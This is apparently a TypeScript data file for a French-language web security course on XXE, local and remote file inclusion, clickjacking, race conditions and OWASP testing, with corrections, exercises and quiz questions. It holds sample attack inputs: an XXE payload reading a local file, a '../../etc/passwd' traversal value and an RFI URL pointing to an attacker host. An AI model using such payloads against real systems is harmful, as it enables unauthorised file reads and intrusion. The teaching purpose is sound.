import type { CourseBody } from '../../types';

export const body: CourseBody = {
  courseId: 'f-xxe-rfi-clickjacking-race',
  lesson: {
    intro:
      'Les deux premiers cours Web ont couvert les injections, le XSS, le contrôle d’accès et les attaques qui détournent le serveur. Il reste des vulnérabilités moins médiatisées mais bien réelles : un analyseur XML trop permissif qui lit des fichiers du serveur, une application qui inclut un fichier dont le nom vient de l’utilisateur, une page piégée superposée à la vraie, ou deux requêtes simultanées qui contournent une limite. Ce cours les explique et les corrige, puis montre comment tester une application de façon méthodique.',
    sections: [
      {
        id: 'xxe',
        title: 'XXE : entités externes XML',
        blocks: [
          { t: 'p', text: 'Le format XML permet de définir des **entités**, des raccourcis remplacés à l’analyse. Une **entité externe** demande à l’analyseur de charger une ressource (un fichier local, une URL). Si l’application analyse du XML fourni par l’utilisateur avec un analyseur qui autorise les entités externes, l’attaquant choisit la ressource chargée : c’est l’attaque **XXE**.' },
          { t: 'code', lang: 'xml', caption: 'Charge XXE (en laboratoire) lisant un fichier local', code: '<?xml version="1.0"?>\n<!DOCTYPE donnees [\n  <!ENTITY x SYSTEM "file:///etc/hostname">\n]>\n<donnees>&x;</donnees>\n\n<!-- Si l’analyseur résout &x;, le contenu du fichier est inséré\n     dans la réponse de l’application. -->' },
          { t: 'def', term: 'Impact d’une XXE', text: 'Selon la configuration : lecture de fichiers du serveur, requêtes vers des services internes (une forme de SSRF), parfois déni de service par expansion d’entités. La donnée lue peut être renvoyée directement ou exfiltrée vers un serveur contrôlé.' },
          { t: 'callout', kind: 'key', title: 'Correction', text: 'Désactiver la résolution des entités externes et des DTD dans l’analyseur XML (c’est souvent une ou deux options de configuration). Préférer des formats plus simples (JSON) quand le XML n’est pas nécessaire, et tenir les bibliothèques d’analyse à jour, car certaines sont vulnérables par défaut selon la version.' },
        ],
      },
      {
        id: 'inclusion',
        title: 'Inclusion de fichiers : LFI et RFI',
        blocks: [
          { t: 'p', text: 'Certaines applications construisent le chemin d’un fichier à inclure à partir d’une donnée de l’utilisateur (`?page=accueil`). Si cette donnée n’est pas contrôlée, l’attaquant choisit le fichier.' },
          {
            t: 'table',
            head: ['Type', 'Principe', 'Conséquence'],
            rows: [
              ['**LFI** (inclusion locale)', 'Inclure un fichier **du serveur** (`?page=../../etc/passwd`)', 'Lecture de fichiers sensibles ; exécution de code si un fichier contrôlé par l’attaquant est inclus'],
              ['**RFI** (inclusion distante)', 'Inclure un fichier depuis une **URL** externe (`?page=http://attaquant/x`)', 'Exécution directe de code fourni par l’attaquant (très grave)'],
            ],
          },
          { t: 'def', term: 'Pourquoi la RFI est rare aujourd’hui', text: 'La RFI suppose que le langage inclut et exécute un fichier distant. Les configurations modernes désactivent par défaut l’inclusion d’URL externes (par exemple `allow_url_include` à off en PHP), ce qui limite la RFI ; la LFI, elle, reste fréquente.' },
          { t: 'callout', kind: 'key', title: 'Correction', text: 'Ne pas construire de chemin ni d’URL à partir d’une entrée utilisateur. Associer chaque valeur attendue à une ressource connue (table de correspondance), ou valider strictement puis normaliser le chemin et vérifier qu’il reste dans le répertoire autorisé. Désactiver l’inclusion d’URL distantes.' },
        ],
      },
      {
        id: 'clickjacking',
        title: 'Clickjacking : détournement de clic',
        blocks: [
          { t: 'p', text: 'Le **clickjacking** consiste à afficher la vraie application dans un cadre invisible, superposé à une page leurre, de sorte que la victime croit cliquer sur le leurre alors qu’elle agit sur l’application où elle est connectée (valider un paiement, changer un réglage).' },
          { t: 'diagram', id: 'clickjacking', caption: 'Clickjacking : un cadre invisible de la vraie application est superposé à une page leurre, au même emplacement.', alt: 'Deux panneaux à la même position d’écran : à gauche la page leurre visible avec un bouton « Voir la vidéo » et le curseur ; à droite le cadre invisible (en pointillés) de la vraie application avec un bouton sensible « Valider le paiement » au même endroit ; la victime croit cliquer sur le leurre mais actionne le bouton sensible caché.' },
          { t: 'code', lang: 'http', caption: 'Protections par en-têtes de réponse', code: 'Content-Security-Policy: frame-ancestors \'none\'\n# ou, pour n’autoriser que son propre site :\nContent-Security-Policy: frame-ancestors \'self\'\n\n# En-tête historique, encore utile pour les vieux navigateurs :\nX-Frame-Options: DENY' },
          { t: 'def', term: 'frame-ancestors', text: 'Directive de la CSP qui indique quels sites ont le droit d’afficher la page dans un cadre (iframe). `\'none\'` interdit tout encadrement ; `\'self\'` ne l’autorise qu’au site lui-même. Elle remplace l’ancien en-tête `X-Frame-Options`.' },
          { t: 'callout', kind: 'tip', text: 'Les pages sensibles (paiement, changement de mot de passe, validation d’action) doivent au minimum interdire leur encadrement. Les actions importantes gagnent aussi à exiger une confirmation explicite, difficile à détourner par superposition.' },
        ],
      },
      {
        id: 'race',
        title: 'Conditions de course applicatives',
        blocks: [
          { t: 'p', text: 'Une **condition de course** (race condition) survient quand le résultat dépend de l’ordre d’exécution de plusieurs opérations concurrentes. En sécurité web, l’attaquant envoie plusieurs requêtes **en parallèle** pour exploiter l’intervalle entre une vérification et l’action correspondante.' },
          { t: 'def', term: 'TOCTOU', text: 'Time-Of-Check to Time-Of-Use : la vérification (« le solde est-il suffisant ? », « ce code promo est-il encore valable ? ») et l’action (débiter, appliquer la remise) ne sont pas atomiques. Entre les deux, une autre requête agit, et la vérification faite ne correspond plus à l’état réel.' },
          {
            t: 'example',
            title: 'Dépasser une limite par requêtes simultanées',
            blocks: [
              { t: 'p', text: 'Un code de réduction est « à usage unique ». L’application vérifie qu’il n’a pas servi, puis l’applique. En envoyant 20 requêtes exactement en même temps, plusieurs passent la vérification avant que la première n’ait marqué le code comme utilisé : la réduction est appliquée plusieurs fois.' },
            ],
          },
          { t: 'callout', kind: 'key', title: 'Correction', text: 'Rendre l’ensemble vérification + action **atomique** : contrainte d’unicité en base, mise à jour conditionnelle en une seule opération (`UPDATE … WHERE non_utilisé`), verrou ou transaction, ou traitement idempotent avec un identifiant de requête. Une limite appliquée en deux étapes non atomiques est contournable.' },
        ],
      },
      {
        id: 'methodo',
        title: 'Tester méthodiquement : le guide OWASP',
        blocks: [
          { t: 'p', text: 'Chercher des vulnérabilités au hasard laisse des trous. Le **guide de test OWASP** (Web Security Testing Guide, WSTG) propose une démarche structurée, par catégories (gestion des sessions, contrôle d’accès, validation des entrées, configuration…), à mener **uniquement sur des applications que l’on est autorisé à tester** : la sienne, un environnement de recette, ou une cible d’entraînement prévue à cet effet.' },
          { t: 'list', ordered: true, items: ['**Cartographier** l’application : pages, points d’entrée, rôles, technologies.', '**Dérouler les catégories** du WSTG, en notant ce qui est testé et le résultat.', '**Reproduire** chaque constat de façon fiable et évaluer son impact.', '**Documenter** : description, preuve, impact, correction proposée.', '**Vérifier** la correction après remédiation.'] },
          { t: 'def', term: 'OWASP ASVS et WSTG', text: 'L’ASVS liste les **exigences** de sécurité à vérifier ; le WSTG décrit **comment** les tester. L’un sert à définir le niveau attendu, l’autre à conduire l’évaluation.' },
          { t: 'callout', kind: 'legal', text: 'Tester une application sans autorisation est illégal, même sans intention de nuire. Un test de sécurité se fait dans un périmètre défini par écrit (voir le cours sur la méthodologie de pentest) ou sur des environnements d’entraînement conçus pour cela.' },
        ],
      },
    ],
    useCases: [
      'Revue d’un service qui importe des fichiers XML : vérifier que l’analyseur refuse les entités externes.',
      'Audit d’une application de commande : tester les codes promo et les paniers contre les conditions de course.',
      'Test méthodique d’une application de recette avec le WSTG, puis rapport et vérification des correctifs.',
    ],
    commonMistakes: [
      'Analyser du XML utilisateur avec un analyseur qui autorise les entités externes par défaut.',
      'Construire un chemin ou une URL d’inclusion à partir d’une entrée utilisateur.',
      'Oublier d’interdire l’encadrement des pages sensibles (clickjacking).',
      'Vérifier puis agir en deux étapes non atomiques, exploitables par requêtes simultanées.',
      'Tester une application sans autorisation écrite.',
    ],
    bestPractices: [
      'Analyseurs XML avec entités externes et DTD désactivées ; JSON quand le XML n’est pas nécessaire.',
      'Aucune inclusion de fichier ou d’URL pilotée par l’utilisateur : table de correspondance ou validation stricte.',
      'En-tête `Content-Security-Policy: frame-ancestors` sur les pages sensibles.',
      'Vérification et action rendues atomiques (contrainte d’unicité, mise à jour conditionnelle, verrou, idempotence).',
      'Tests guidés par le WSTG, uniquement sur des cibles autorisées, avec documentation et vérification des correctifs.',
    ],
    keyPoints: [
      'XXE : analyseur XML trop permissif ; corriger en désactivant entités externes et DTD.',
      'LFI/RFI : ne jamais piloter un chemin ou une URL d’inclusion par l’entrée utilisateur.',
      'Clickjacking : `frame-ancestors` interdit l’encadrement des pages sensibles.',
      'Race condition : rendre vérification + action atomiques, sinon la limite est contournable.',
      'Tester avec méthode (WSTG), uniquement sur des applications autorisées.',
    ],
  },
  practice: [
    {
      id: 'revue-xxe-inclusion',
      kind: 'analysis',
      title: 'Repérer XXE et inclusion dans deux extraits',
      context: [
        { t: 'p', text: 'Deux extraits d’une application :' },
        { t: 'code', lang: 'text', code: '# 1. Import d’un document XML envoyé par l’utilisateur\ndoc = parseur_xml.parse(requete.corps)   # analyseur par défaut\n\n# 2. Affichage d’une page d’aide\n#    URL appelée : /aide?sujet=installation\nfichier = "/var/www/aide/" + requete.parametre("sujet") + ".html"\nrenvoyer(lire(fichier))' },
      ],
      steps: ['Nommer la vulnérabilité de chaque extrait et son impact possible.', 'Proposer la correction de chacun.', 'Indiquer un test simple pour vérifier que la correction tient.'],
    },
    {
      id: 'race-promo',
      kind: 'case',
      title: 'Cas pratique : code promo à usage unique contourné',
      context: [{ t: 'p', text: 'Un site de commerce constate qu’un code de réduction « à usage unique » a été appliqué plusieurs fois sur une même commande. Les journaux montrent une rafale de requêtes identiques envoyées en moins de 50 ms.' }],
      steps: ['Expliquer le mécanisme de l’attaque.', 'Proposer une correction atomique au niveau applicatif et au niveau base de données.', 'Indiquer comment détecter ce type d’abus.'],
    },
  ],
  questions: [
    { id: 'xrc-q1', type: 'single', difficulty: 2, skills: ['f-xxe-rfi'], prompt: 'Qu’est-ce qui rend une attaque XXE possible ?', options: [{ id: 'a', text: 'Un analyseur XML qui résout les entités externes sur du XML fourni par l’utilisateur' }, { id: 'b', text: 'Un mot de passe trop court' }, { id: 'c', text: 'L’absence de HTTPS' }, { id: 'd', text: 'Un cookie sans l’attribut Secure' }] },
    { id: 'xrc-q2', type: 'multi', difficulty: 3, skills: ['f-xxe-rfi'], prompt: 'Quels impacts une XXE peut-elle avoir selon la configuration ?', options: [{ id: 'a', text: 'Lecture de fichiers du serveur' }, { id: 'b', text: 'Requêtes vers des services internes (forme de SSRF)' }, { id: 'c', text: 'Déni de service par expansion d’entités' }, { id: 'd', text: 'Augmentation de la vitesse du serveur' }] },
    { id: 'xrc-q3', type: 'single', difficulty: 2, skills: ['f-xxe-rfi'], prompt: 'Quelle est la correction de référence contre XXE ?', options: [{ id: 'a', text: 'Désactiver la résolution des entités externes et des DTD dans l’analyseur XML' }, { id: 'b', text: 'Allonger les mots de passe' }, { id: 'c', text: 'Changer le port du serveur' }, { id: 'd', text: 'Mettre le site en HTTP' }] },
    { id: 'xrc-q4', type: 'single', difficulty: 2, skills: ['f-xxe-rfi'], prompt: 'Quelle différence entre LFI et RFI ?', options: [{ id: 'a', text: 'La LFI inclut un fichier du serveur, la RFI un fichier depuis une URL externe' }, { id: 'b', text: 'La LFI concerne IPv6, la RFI IPv4' }, { id: 'c', text: 'La LFI chiffre les fichiers, la RFI les signe' }, { id: 'd', text: 'Il n’y a aucune différence' }] },
    { id: 'xrc-q5', type: 'truefalse', difficulty: 2, skills: ['f-xxe-rfi'], prompt: 'Construire le chemin d’un fichier à inclure à partir d’un paramètre fourni par l’utilisateur, sans contrôle, est une cause d’inclusion de fichier.' },
    { id: 'xrc-q6', type: 'short', difficulty: 2, skills: ['f-xxe-rfi'], prompt: 'Quelle approche, plus sûre qu’une validation de chemin, associe chaque valeur attendue à une ressource connue ? (deux ou trois mots)', placeholder: 'table de …' },
    { id: 'xrc-q7', type: 'single', difficulty: 2, skills: ['f-clickjacking'], prompt: 'En quoi consiste le clickjacking ?', options: [{ id: 'a', text: 'Superposer la vraie application, dans un cadre invisible, à une page leurre pour détourner les clics de la victime' }, { id: 'b', text: 'Deviner le mot de passe par force brute' }, { id: 'c', text: 'Injecter du SQL dans un formulaire' }, { id: 'd', text: 'Chiffrer les fichiers de la victime' }] },
    { id: 'xrc-q8', type: 'short', difficulty: 2, skills: ['f-clickjacking'], prompt: 'Quelle directive de la CSP indique quels sites peuvent afficher la page dans un cadre (iframe) ?', placeholder: 'frame-…' },
    { id: 'xrc-q9', type: 'multi', difficulty: 2, skills: ['f-clickjacking'], prompt: 'Quelles mesures protègent du clickjacking ?', options: [{ id: 'a', text: '`Content-Security-Policy: frame-ancestors \'none\'`' }, { id: 'b', text: '`X-Frame-Options: DENY` pour les anciens navigateurs' }, { id: 'c', text: 'Exiger une confirmation explicite des actions sensibles' }, { id: 'd', text: 'Désactiver le HTTPS' }] },
    { id: 'xrc-q10', type: 'open', difficulty: 3, skills: ['f-race'], prompt: 'Expliquez ce qu’est une condition de course de type TOCTOU dans une application web et donnez un exemple où elle permet de contourner une limite.' },
    { id: 'xrc-q11', type: 'truefalse', difficulty: 2, skills: ['f-race'], prompt: 'Vérifier puis agir en deux étapes non atomiques peut être contourné en envoyant plusieurs requêtes exactement en même temps.' },
    { id: 'xrc-q12', type: 'multi', difficulty: 3, skills: ['f-race'], prompt: 'Quelles corrections rendent sûre une limite « à usage unique » ?', options: [{ id: 'a', text: 'Une contrainte d’unicité en base de données' }, { id: 'b', text: 'Une mise à jour conditionnelle atomique (`UPDATE … WHERE non_utilisé`)' }, { id: 'c', text: 'Un verrou ou une transaction couvrant vérification et action' }, { id: 'd', text: 'Afficher un message « une seule fois, merci »' }] },
    { id: 'xrc-q13', type: 'single', difficulty: 2, skills: ['f-methodo-test'], prompt: 'À quoi sert le guide de test OWASP (WSTG) ?', options: [{ id: 'a', text: 'À tester une application de façon structurée, par catégories, sur une cible autorisée' }, { id: 'b', text: 'À chiffrer les cookies' }, { id: 'c', text: 'À remplacer le pare-feu' }, { id: 'd', text: 'À générer des mots de passe' }] },
    { id: 'xrc-q14', type: 'truefalse', difficulty: 1, skills: ['f-methodo-test'], prompt: 'Tester la sécurité d’une application sans autorisation écrite est acceptable tant qu’on n’a pas l’intention de nuire.' },
    { id: 'xrc-q15', type: 'single', difficulty: 2, skills: ['f-methodo-test'], prompt: 'Quelle est la différence entre l’OWASP ASVS et le WSTG ?', options: [{ id: 'a', text: 'L’ASVS liste les exigences à vérifier, le WSTG décrit comment les tester' }, { id: 'b', text: 'L’ASVS est un pare-feu, le WSTG un antivirus' }, { id: 'c', text: 'Ils sont identiques' }, { id: 'd', text: 'L’ASVS ne concerne que le réseau' }] },
    { id: 'xrc-q16', type: 'open', difficulty: 3, skills: ['f-methodo-test', 'f-xxe-rfi'], prompt: 'On vous confie le test de sécurité d’une application interne de recette. Décrivez votre démarche méthodique et les précautions de cadre (autorisation, périmètre, données).' },
  ],
  resources: [
    { title: 'XML External Entity Prevention Cheat Sheet', source: 'OWASP', url: 'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html' },
    { title: 'File Upload / Path Traversal & LFI (Testing Guide)', source: 'OWASP', url: 'https://owasp.org/www-project-web-security-testing-guide/' },
    { title: 'Clickjacking Defense Cheat Sheet', source: 'OWASP', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html' },
    { title: 'Content-Security-Policy: frame-ancestors', source: 'MDN Web Docs', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors' },
    { title: 'Web Security Testing Guide (WSTG)', source: 'OWASP', url: 'https://owasp.org/www-project-web-security-testing-guide/' },
  ],
};
